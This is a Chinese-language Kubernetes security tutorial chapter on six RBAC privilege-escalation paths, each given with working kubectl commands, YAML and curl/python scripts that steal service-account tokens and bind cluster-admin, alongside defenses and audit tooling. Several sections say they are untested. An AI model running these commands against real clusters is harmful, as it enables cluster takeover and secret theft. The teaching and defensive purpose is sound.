# Ch 26 — RBAC 提權：危險 verb 與 token 竊取

> **目標**：系統性掌握 K8s RBAC 的六條主要提權路徑，理解每條路徑需要什麼初始權限、如何利用、防禦要點在哪。
>
> **環境**：minikube 1.33+ / kind；建議搭配 kube-goat（`git clone https://github.com/ksoclabs/kube-goat`）進行真實操作；需要 kubectl cluster-admin 才能建立測試環境。

---

## 為什麼需要這一章

Ch 25 我們完成了偵察：從 Pod 內讀到 SA token，打 API server，拿到當前 SA 能做的事情清單。你現在站在一個低權限的 `default` SA 裡，手上有一張 JWT，能做的事可能只有 `list pods` 或 `get configmaps`。

偵察的終點不是終點，是起點。

**偵察告訴你「現在在哪」，提權讓你抵達「想去哪」**。K8s 提權的終點通常是 cluster-admin 等級的 token——拿到之後，整個 cluster 就是你的了：讀任意 Secret、exec 進任意 Pod、部署後門 DaemonSet、竄改 RBAC 設定。

這一章把六條主要提權路徑拆開講。每條路徑都有它的前置條件、利用姿勢、防禦點。它們不是互斥的——現實中你可能需要把兩三條串起來才能爬到頂。

---

## 先建直覺

### 提權的本質

K8s 提權的本質比 Linux local privesc 簡單一點：**你不需要找核心漏洞，RBAC 本身就是梯子，問題只在管理員有沒有在梯子上加鎖。**

類比：你在一棟辦公室大樓，手上是一張只能開一樓茶水間的門禁卡。提權的意思是找到一種方法，讓你能開到十樓的 server room。路徑可能是：

- 茶水間有人把二樓備用卡忘在抽屜裡（`list secrets`）
- 你的門禁卡有「建立新員工」的權限，你自己開一張新卡並給它十樓權限（`bind`/`escalate`）
- 你的卡可以「代理」任何人刷門禁（`impersonate`）
- 你能把高層的工作證換到你自己的名牌夾裡帶走（`create pods` 搭配高權限 SA）

K8s 的提權路徑都能對應這種模型。關鍵是：**你拿到的第一個 token 能做什麼 verb，那個 verb 就是你的梯子。**

### 提權路徑總圖

```
低權限 SA Token
       │
       ├─[路徑二: list/get secrets]──────────────────────────────┐
       │       讀 namespace 內所有 Secret，找高權限 SA token       │
       │                                                          │
       ├─[路徑四: impersonate]────────────────────────────────────┤
       │       HTTP header 直接偽裝成 system:masters              │
       │                                                          │
       ├─[路徑五: bind/escalate]──────────────────────────────────┤
       │       把 cluster-admin 綁到自己的 SA                      │
       │                                                          │
       ├─[路徑一: create pods]────────────────────┐               │
       │       建 Pod 指定高權限 SA               │               │
       │                                          ▼               │
       │                                   Pod 啟動後             │
       │                                 讀 /var/run/secrets      │
       │                                 拿到高權限 SA JWT ────────┤
       │                                                          │
       ├─[路徑三: create pods + exec]──────────────────────────────┤
       │       exec 進高權限 Pod，在裡面讀 token                   │
       │                                                          │
       └─[路徑六: create SA + token]──────────────────────────────┤
               建新 SA + 搭配 bind 拿 long-lived token            │
                                                                  ▼
                                                    高權限 token / cluster-admin
                                                    ─────────────────────────
                                                    讀任意 Secret
                                                    exec 任意 Pod
                                                    部署後門 DaemonSet
                                                    竄改 RBAC
```

---

## 提權路徑詳解

### 路徑一：`create pods` → 掛入高權限 SA 的 token

#### 需要的初始權限

```
verbs: ["create"]
resources: ["pods"]
```

在任意 namespace（視目標 SA 所在位置）。

#### 利用思路

`spec.serviceAccountName` 欄位讓你指定 Pod 用哪個 SA 的身分。kubelet 收到 Pod spec 後，會自動把那個 SA 的 token 以 projected volume 掛進容器的 `/var/run/secrets/kubernetes.io/serviceaccount/token`。

**關鍵限制**：你指定的 SA 必須在同一個 namespace。跨 namespace 的 SA 你指定不到——但如果你能在 `kube-system` 建 Pod（通常需要更高的 RBAC），你就能指定那裡的高權限 SA。

攻擊流程：

1. Ch 25 偵察，確認目前 namespace 內有哪些高權限 SA（`kubectl get serviceaccounts -n default`）
2. 找出哪些 SA 有強力綁定（查 RoleBinding / ClusterRoleBinding）
3. 建一個掛該 SA 的 Pod
4. Exec 進去讀 token

#### 利用 YAML

```yaml
# privesc-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: default
spec:
  serviceAccountName: cluster-admin-sa   # 替換成目標 SA 名稱
  containers:
  - name: attacker
    image: bitnami/kubectl:latest
    command: ["sleep", "3600"]
```

```bash
# 部署惡意 Pod
kubectl apply -f privesc-pod.yaml

# 等 Pod Running 後 exec 進去
kubectl exec -it privesc-pod -- /bin/bash

# 在 Pod 內讀高權限 SA 的 token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 驗證 token 能做什麼
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN get secrets -A
```

**本段未實測，為理論預期行為**

#### 防禦

- 在 ClusterRole/Role 層嚴格限制 `create pods` 的授予對象；絕大多數應用程式 SA 不需要這個 verb
- 高權限 SA 設定 `automountServiceAccountToken: false`：

  ```yaml
  apiVersion: v1
  kind: ServiceAccount
  metadata:
    name: cluster-admin-sa
  automountServiceAccountToken: false
  ```

- 使用 OPA / Kyverno admission controller 拒絕 `spec.serviceAccountName` 指向高權限 SA 的 Pod spec（Ch 35 展開）
- 用 LimitRanger 限制哪些 SA 能被 Pod 引用

---

### 路徑二：`get/list secrets` → 拿到 namespace 內所有 token

#### 需要的初始權限

```
verbs: ["list"]  # 或 ["get"]
resources: ["secrets"]
```

範圍可以是單一 namespace，也可以是 cluster-wide。

#### 利用思路

這條路徑最直接，不需要任何間接步驟。Secret 物件存的東西可能包括：

- `kubernetes.io/service-account-token` type 的 SA token（K8s 1.24 前自動建立；1.24 後只有手動建的 long-lived token 才會出現）
- TLS cert / private key
- Docker registry credential
- 應用程式的 DB 密碼、API key

**最危險的情形**：如果你的 `list secrets` 範圍是 `kube-system`，幾乎等同直接 cluster takeover。`kube-system` 裡住著 coredns、kube-proxy、metrics-server 等元件的 SA，部分部署環境中還有高度特權的 SA token Secret。

K8s 1.24 之後，projection token 不再以 Secret 物件呈現——它是動態產生後掛進 Pod 的，沒有物件可讀。但只要有人手動建了 `kubernetes.io/service-account-token` type 的 Secret，它還是能被讀出來，而且是 **long-lived（不過期）** 的 token，比 projection token 更危險。

#### 利用指令

```bash
# 列出當前 namespace 所有 Secret
kubectl get secrets -o yaml

# 用 API server 直接拿（Pod 內的 SA token 打法）
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/secrets | \
  python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for item in data.get('items', []):
    name = item['metadata']['name']
    stype = item.get('type', '')
    d = item.get('data', {})
    for k, v in d.items():
        decoded = base64.b64decode(v).decode('utf-8', errors='replace')
        print(f'[{name}][{stype}] {k}: {decoded[:120]}')
"
```

拿到 token 後，用 Ch 25 那套方式測它的權限。

```bash
# 確認 kube-system 是否能讀（通常一般 SA 不行，但萬一有）
kubectl get secrets -n kube-system -o yaml 2>/dev/null | grep 'type: kubernetes.io/service-account-token' -A5
```

#### 防禦

- **絕不**把 `list secrets` 授予應用程式 SA；連 `get secrets` 都要謹慎，只授予需要讀特定 Secret 的 SA，且用 resourceNames 鎖到那個 Secret 的名字
- 永遠不要在 `kube-system` 範圍給外部 SA 任何 Secret 相關 verb
- 啟用 EncryptionConfiguration 讓 Secret 在 etcd 層加密（防的是 etcd 洩露，不防 API 層的讀取）

---

### 路徑三：`create pods` + `create pods/exec` → 直接執行任意指令

#### 需要的初始權限

```
verbs: ["create"]
resources: ["pods", "pods/exec"]
```

或是已有高權限 Pod 存在，而你有 `get pods/exec`（exec 進已有 Pod）。

#### 利用思路

路徑一靠的是 SA token 機制——你建一個 Pod，等 kubelet 把 token 掛進去，再讀出來用。路徑三更直接：你 exec 進 Pod，**在 Pod 的 process 空間裡**直接執行指令，不需要把 token 搬出來。

兩種玩法：

**玩法 A**：自己建一個特權 Pod，exec 進去做壞事（例如掛 hostPath 讀節點檔案，這是 Ch 27 的主題）。

**玩法 B**：找 cluster 裡已有的高權限 Pod，exec 進去。`kube-system` 裡的 Pod 通常跑著有高度 cluster 權限的 SA——kube-proxy 有網路規則讀寫、某些 metrics-server 部署有廣泛的 get/list 權限。

```bash
# 找 kube-system 裡有趣的 Pod
kubectl get pods -n kube-system

# 直接 exec 進去（如果你的 SA 有 pods/exec 在 kube-system）
kubectl exec -it -n kube-system <pod-name> -- /bin/sh

# Pod 內讀它的 SA token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

#### `pods/exec` 是什麼

`pods/exec` 是 K8s 的 subresource——它是 Pod 物件下的子資源，和 Pod 本身的 RBAC 授權是分開的。你可以有 `get pods` 卻沒有 `get pods/exec`，也可以只有 `create pods/exec` 沒有 `create pods`。這個設計本意是讓授權更細粒度，但實務上常被忽略，管理員給了 `create pods` 就忘了同時鎖 `pods/exec`。

**本段未實測，為理論預期行為**

#### 防禦

- `pods/exec` 是高風險 verb，只授給需要偵錯的角色，且最好搭配 audit log 警示
- 生產環境應有告警：任何 `exec` 動作觸發告警（Falco 規則 `Terminal shell in container`）
- 不要讓 `kube-system` 的 Pod 以高權限 SA 跑，能用 `--as` 降權就降

---

### 路徑四：`impersonate` → 偽裝成任何身分

#### 需要的初始權限

```
verbs: ["impersonate"]
resources: ["users"]  # 或 "groups", "serviceaccounts"
```

#### 利用思路

這是六條路徑裡最乾淨的一條——**一步到頂，不需要任何中間跳板**。

`impersonate` verb 讓 API server 允許你在請求裡附加一個「我要代表誰」的 header，API server 用那個身分做授權決策，而不是用你自己的 SA。

你可以偽裝成：
- 任意 user（包括 `system:masters` 這個群組）
- 任意 group
- 任意 ServiceAccount

```bash
# 用 kubectl 偽裝成 system:masters 群組
kubectl --as-group=system:masters get secrets -A

# 或偽裝成特定 user
kubectl --as=some-admin-user get clusterrolebindings

# 直接打 API server（Pod 內）
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-Group: system:masters" \
  $APISERVER/api/v1/secrets | python3 -m json.tool
```

`system:masters` 是 K8s 內建的超級群組，cluster-admin ClusterRole 綁到這個群組，屬於它的身分完全繞過 RBAC 授權（k8s 源碼層級的硬編碼）。

#### 為什麼這個 verb 存在

它的合法用途是：CI/CD pipeline SA 需要「代替」某個 user 做操作，或者 operator 需要以特定身分測試 RBAC 設定。`kubectl auth can-i` 的 `--as` 旗標背後就是這個機制。

#### 防禦

- `impersonate` verb 的授予必須視為等同授予 cluster-admin，任何應用程式 SA 都絕對不能有它
- 用 audit log 監控所有帶 `Impersonate-User` / `Impersonate-Group` header 的請求
- 用 OPA 或 Kyverno 擋掉讓 SA 拿到這個 verb 的 RBAC 設定

---

### 路徑五：`bind` / `escalate` → 自我升權

#### 需要的初始權限

```
# 路徑 5a：bind verb
verbs: ["bind"]
resources: ["clusterrolebindings"]  # 或 "rolebindings"

# 路徑 5b：escalate verb
verbs: ["escalate"]
resources: ["clusterroles"]  # 或 "roles"
```

#### 利用思路：`bind`

`bind` verb 讓你繞過 K8s 的一個重要安全機制。

K8s 設計上不讓你建一個綁到比你自己擁有更高權限的 Role 的 Binding——否則你可以把 cluster-admin 綁到自己身上，瞬間提權。這個限制叫做 **privilege escalation prevention（提權防護）**。

但如果你有 `bind` verb，這個防護就消失了。你可以：

```bash
# 把 cluster-admin 綁到自己的 SA
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=default:my-compromised-sa

# 之後用自己的 SA token 就有 cluster-admin 了
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN get secrets -A
```

等同直接把自己升到 cluster-admin。

#### 利用思路：`escalate`

`escalate` verb 讓你修改已有的 Role 的 rules，增加你原本沒有的 verb：

```bash
# 修改一個現有的 Role，把 list secrets 加進去
kubectl patch role my-limited-role -n default \
  --type=json \
  -p='[{"op":"add","path":"/rules/0/verbs/-","value":"list"},
       {"op":"add","path":"/rules/0/resources/-","value":"secrets"}]'
```

或者更直接，建一個新的 ClusterRole 然後用 `bind` 綁到自己。

#### K8s 的內建防護機制

沒有 `bind` verb 的情況下，即使你有 `create rolebindings`，你只能把你自己擁有的 Role 綁到別人——不能把你沒有的 Role 綁到任何人。這個機制在 API server 層做，不是 OPA 外掛。`bind` verb 是特意設計來繞過它的「豁免票」，幾乎沒有合法的使用場景。

**本段未實測，為理論預期行為**

#### 防禦

- `bind` 和 `escalate` 兩個 verb 一律不授予任何應用程式 SA，也不授予一般開發者的 Role
- 定期用 rbac-police 或 rbac-tool 掃 cluster，找出擁有這兩個 verb 的 binding
- 審計每一次對 ClusterRoleBinding / RoleBinding 的 CREATE / PATCH / UPDATE 操作

---

### 路徑六：`create serviceaccounts` + `create tokens` → 建高權限 token

#### 需要的初始權限

```
verbs: ["create"]
resources: ["serviceaccounts"]  # 建新 SA

# 加上下列其一拿到 token：
verbs: ["create"]
resources: ["serviceaccounts/token"]  # TokenRequest API

# 或搭配 bind 把高權限 Role 綁到新 SA
```

#### 利用思路

這條路徑比前幾條複雜，通常需要配合路徑五（`bind`）才能走完整流程：

1. 建一個新的 SA：

   ```bash
   kubectl create serviceaccount attacker-sa -n default
   ```

2. 用 `bind` 把 cluster-admin 綁到這個新 SA（需要 `bind` verb）：

   ```bash
   kubectl create clusterrolebinding attacker-binding \
     --clusterrole=cluster-admin \
     --serviceaccount=default:attacker-sa
   ```

3. 用 TokenRequest API 拿 token（需要 `create serviceaccounts/token`）：

   ```bash
   kubectl create token attacker-sa -n default --duration=8760h
   ```

4. 或者建 long-lived token Secret（K8s 1.24+ 需手動）：

   ```yaml
   apiVersion: v1
   kind: Secret
   metadata:
     name: attacker-token
     namespace: default
     annotations:
       kubernetes.io/service-account.name: attacker-sa
   type: kubernetes.io/service-account-token
   ```

   ```bash
   kubectl apply -f attacker-token.yaml
   kubectl get secret attacker-token -o jsonpath='{.data.token}' | base64 -d
   ```

Long-lived token 的危險在於它**不過期**——一旦被竊，直到手動刪除該 Secret 前都有效。

**本段未實測，為理論預期行為**

#### 防禦

- `create serviceaccounts/token` 是高風險 verb，只授給需要動態發 token 的 operator
- 優先使用有 `expirationSeconds` 的 short-lived TokenRequest，避免 long-lived token Secret
- 監控 `kubernetes.io/service-account-token` type 的 Secret 建立事件

---

## 對比取捨表

| 提權路徑 | 需要的初始 verb | 危險等級 | 步驟數 | 現實中出現頻率 |
|---------|--------------|---------|-------|------------|
| 路徑四：`impersonate` | `impersonate` on users/groups | 最高（一步到頂） | 1 | 低（管理員較少犯這個錯） |
| 路徑五：`bind` | `bind` on rolebindings | 最高（一步到頂） | 1-2 | 中（CI/CD SA 常有） |
| 路徑五：`escalate` | `escalate` on roles | 高 | 2-3 | 低 |
| 路徑二：`list secrets` | `list` on secrets | 高（需要 namespace 有高權限 token） | 1 | 高（最常被誤授予） |
| 路徑一：`create pods` | `create` on pods | 中-高（需要 namespace 有高權限 SA） | 3-4 | 高（Helm chart 常請求） |
| 路徑三：`pods/exec` | `create/get` on pods/exec | 中-高（取決於目標 Pod） | 2-3 | 高（開發者常開著） |
| 路徑六：`create SA + token` | `create` SA + token + bind | 高（完整鏈） | 4-5 | 低（需要多個 verb 組合） |

**最常被忽略的危險 verb 排名**（依現實誤授頻率）：

1. `list secrets`——開發者說「我需要讀 DB 密碼」，管理員給了 `list secrets` 而不是 `get secrets` + resourceName
2. `pods/exec`——讓開發者能 debug，忘了這個 verb 的破壞力
3. `create pods`——Helm chart 的 ServiceAccount 常預設請求這個權限
4. `bind` on ClusterRoleBindings——CI/CD pipeline「方便管理 RBAC」

---

## 踩雷集錦

**1. 把 `list secrets` 當無害 verb**

`list secrets` 和 `get secrets` 看起來差不多，實際上 `list` 會把整個 namespace 的 Secret 一次吐出來，每個 Secret 的 `data` 欄位全部包含。`get` 加上 resourceName 白名單才是正確做法。

**2. 以為 1.24 後 SA token 不在 Secret 了所以 `list secrets` 安全**

K8s 1.24 讓 projected token 不自動建 Secret，但你 namespace 裡的 Docker registry credential、TLS cert、app API key 全都還在 Secret 裡。`list secrets` 的危險沒有因為 1.24 降低多少。

**3. 以為 `create pods` 只是建 Pod，不是安全問題**

很多人覺得「我只是讓這個 SA 能部署自己的 Pod 而已」。但 `create pods` 的 spec 是全開的——任何 `serviceAccountName`、任何 `hostPath`、任何 `securityContext`，全由 Pod spec 決定。沒有 admission controller 就沒有防護。

**4. `pods/exec` 忘了加進 audit log 告警**

`pods/exec` 動作在正常環境幾乎不該發生（production Pod 不需要人 exec 進去）。但很多 cluster 的 audit policy 沒有特別為這個加高嚴重度告警，攻擊者可以靜靜地 exec 一整天。

**5. 建了測試用的 long-lived token Secret 沒有清除**

開發測試時「方便」地建了一個 SA token Secret，測完沒刪。這個 Secret 從此留在 etcd 裡，直到有人去刪才失效。不過期的 token 是長期後門。

---

## 進階延伸

### 稽核工具

**rbac-police**（Palo Alto 開源）：

```bash
git clone https://github.com/PaloAltoNetworks/rbac-police
cd rbac-police
./rbac-police eval lib/police.rego -a
```

掃整個 cluster 的 RBAC 設定，找出有危險 verb 組合的 SA，輸出風險報告。

**rbac-tool**（kubectl krew 插件）：

```bash
kubectl krew install rbac-tool

# 查誰能 create pods
kubectl rbac-tool who-can create pods

# 查誰能 list secrets
kubectl rbac-tool who-can list secrets -n kube-system

# 視覺化某個 SA 的所有權限
kubectl rbac-tool policy-rules -sa default:my-sa
```

**手動審計**（最快的第一步）：

```bash
# 列出所有 ClusterRoleBinding 和 RoleBinding
kubectl get clusterrolebindings -o json | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    role = item['roleRef']['name']
    subjects = item.get('subjects', [])
    for s in subjects:
        print(f'{item[\"metadata\"][\"name\"]}: {s.get(\"kind\")} {s.get(\"namespace\",\"-\")}/{s.get(\"name\")} -> {role}')
" | grep -E 'cluster-admin|admin|edit'

# 找 kube-system 裡的高危 binding
kubectl get rolebindings,clusterrolebindings -A -o json | \
  python3 -c "
import sys,json
d=json.load(sys.stdin)
for i in d['items']:
  for s in i.get('subjects',[]):
    if s.get('namespace')=='kube-system':
      print(i['metadata']['name'], s['name'], i['roleRef']['name'])
"
```

### Controller SA 控制

K8s 內建的 controller manager 跑著幾十個 controller，每個 controller 都有自己的 SA，部分有相當高的 RBAC 權限（例如 deployment-controller 需要 manage ReplicaSets）。這些 SA 的 token 通常掛在 `kube-system` 的 Pod 裡。

如果你能 exec 進 controller manager Pod，等於拿到了幾乎全域的管理能力。防禦方向：

- 確認 controller manager Pod 的 `hostNetwork: false`、`hostPID: false`
- 用 PodSecurity admission 在 `kube-system` 強制 restricted policy（但這可能讓某些 controller 無法啟動，需要仔細測試）
- controller manager 的 `--use-service-account-credentials` 開啟，讓每個 controller 用各自獨立的 SA，不共用一個超級 SA

### RBAC 的 aggregation 陷阱

`ClusterRole` 支援 `aggregationRule`，可以把多個帶特定 label 的 ClusterRole 自動合併成一個。`cluster-admin` 就是用這個機制組合起來的。

攻擊者如果有 `create clusterroles`，可以建一個帶 `rbac.authorization.k8s.io/aggregate-to-cluster-admin: "true"` label 的 ClusterRole，它的規則會自動合併進 `cluster-admin`——但這個向量不常見，因為通常 `create clusterroles` 本身已是高風險。

---

## 本章重點整理

- K8s 提權的本質是：你現有的 RBAC verb 是梯子，爬到高權限 SA token 就贏
- 六條路徑各有前置條件：`list secrets`（最容易被誤授）、`create pods`（最隱蔽）、`pods/exec`（最直接）、`impersonate`（最乾淨）、`bind/escalate`（最一步到頂）、`create SA + token`（最需要組合）
- 路徑四（`impersonate`）和路徑五（`bind`）一步到 cluster-admin，是最危險的兩個 verb
- 路徑二（`list secrets`）在現實中最常見，開發者常誤以為 `list` 比 `get` 安全
- K8s 1.24 後 projected token 不自動建 Secret，但 long-lived token Secret 仍然存在且不過期
- 防禦核心：最小權限 + 危險 verb 告警 + admission controller 擋危險 Pod spec + 定期 RBAC 稽核

---

## 自我檢核

1. 如果你的 SA 有 `create pods` 但沒有 `create pods/exec`，你還能用路徑一提權嗎？需要多做什麼步驟？

2. `impersonate` verb 和 `bind` verb 都能讓你一步到 cluster-admin，它們的本質差異是什麼？在 audit log 裡各自會留下什麼痕跡？

3. K8s 1.24 把 SA token 改成 projected token（不建 Secret），`list secrets` 就安全了嗎？為什麼？

4. 一個 SA 有 `create rolebindings` 但沒有 `bind` verb，它能把 `cluster-admin` ClusterRole 綁到自己嗎？這個限制在哪一層實施？

5. `rbac-tool who-can list secrets` 這個指令的輸出，你怎麼判斷哪些結果是真正的風險、哪些是合理授權？

6. 為什麼 long-lived token Secret（`kubernetes.io/service-account-token` type）比 `kubectl create token` 產生的 token 更危險？

---

## 延伸閱讀

- [Kubernetes RBAC Good Practices（官方文件）](https://kubernetes.io/docs/concepts/security/rbac-good-practices/) — 官方列出的危險 verb 清單與建議
- [rbac-police GitHub（Palo Alto Networks）](https://github.com/PaloAltoNetworks/rbac-police) — OPA 規則式 RBAC 稽核工具，可直接整合 CI/CD
- [Kubernetes Attack Matrix（Microsoft）](https://www.microsoft.com/en-us/security/blog/2020/04/02/attack-matrix-kubernetes/) — 微軟整理的 K8s ATT&CK 矩陣，提權路徑有專門一欄
- [Bad Pods（BishopFox）](https://github.com/BishopFox/badPods) — 各種危險 Pod spec 的 PoC 合集，對應路徑一和路徑三
- [Threat Matrix for Kubernetes（MITRE）](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/) — 更完整的 K8s 威脅矩陣，包含偵察到橫向移動的完整攻擊鏈

---

→ [Ch 27 — Pod 逃逸到節點：hostPath / hostPID / privileged](./27-pod-escape-to-node.md)
